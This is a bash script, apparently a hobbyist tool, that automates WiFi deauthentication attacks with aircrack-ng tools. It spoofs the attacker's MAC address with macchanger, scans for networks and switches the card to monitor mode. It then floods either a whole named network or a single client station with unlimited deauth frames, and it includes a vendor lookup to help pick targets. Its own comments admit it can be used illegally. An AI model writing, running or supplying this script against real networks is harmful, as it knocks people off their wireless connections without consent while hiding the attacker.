#!/bin/bash

# made by EMLGaming and thanks for using it
# to run first type "chmod +x deauth.sh" and "chmod +x deauthall.sh" and then "./deauth.sh"
# then you are all good to go and this script is made for moose
# the script is not illigal but you can use it in a way that is illigal
# and moose you can thank me for this it took quite long xD


echo -e "\e[36mthis script is for da m00seman so we gotta go fast af boii\e[31m"
sleep 1
clear		


echo " "
echo "who would you like to deauth?"           
echo " "                                  

PS3='Deauth: '
options=("all" "network" "target" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "all")

./deauthall.sh
            
	  exit

           ;;
        "network")
            echo -e "\e[36mlets deauth a network"
iwconfig
echo -e "\e[31mtype your wireless card name:\e[36m"
read wire
ifconfig $wire down
macchanger -r $wire
ifconfig $wire up
clear


echo "it is now scanning networks so this takes a little bit"
sleep 5
iw dev $wire scan | egrep "SSID|primary channel"
echo -e "\e[31mtype the name of the network:\e[36m"
read name
echo -e "\e[31mand the channel:\e[36m"
read channel
airmon-ng start $wire
airmon-ng check kill
clear	





ifconfig $wire"mon" down
iwconfig $wire"mon" channel $channel
ifconfig $wire"mon" up

echo "now you are deauthing the network if you want to stop just close the window"
xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read" 


		exit

            ;;
        "target")
            echo "lets deauth a target"
iwconfig
echo -e "\e[31mtype your wireless card name:\e[36m"
read wire
ifconfig $wire down
macchanger -r $wire
ifconfig $wire up
clear


echo "it is now scanning networks so this takes a little bit"
sleep 5
iw dev $wire scan | egrep "SSID|primary channel"
echo -e "\e[31mtype the name of the network:\e[36m"
read name
echo -e "\e[31mand the channel:\e[36m"
read channel
airmon-ng start $wire
airmon-ng check kill
clear	

gnome-terminal -x sh -c "airodump-ng --essid '$name' -c $channel $wire""mon" 
				

		echo "\e[31m "
		echo "would you like to look up a mac adress?"
		echo " "
		PS3="Enter your choise: "
		options=("yes" "no")
		select opt in "${options[@]}"
		do
 		   case $opt in

   		     "yes")
     		       echo ""
			echo -e "type the first 6 characters of the station"
			echo -e "don't type the ':' do only xxxxxx"
			read oui
			grep -i $oui /usr/share/nmap/nmap-mac-prefixes
    		       ;;
    		    "no")
      		      break
       		     ;;
      		  *) echo invalid option;;
  		  esac
		done
		echo -e "station of the target"
		echo -e "but now make sure to type it like XX:00:XX:00:XX:00\e[36m"
		read station
		echo -e "when you are done just close the window"
		xterm -e "aireplay-ng -0 0 -e '$name' -c '$station' $wire""mon; read"

		exit

            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done




echo -e "\e[31mpress enter to get wireless card out of monitor mode!\e[36m"
read 
airmon-ng stop $wire"mon"
clear
echo -e "DONE!!"
sleep 2
clear
# done!





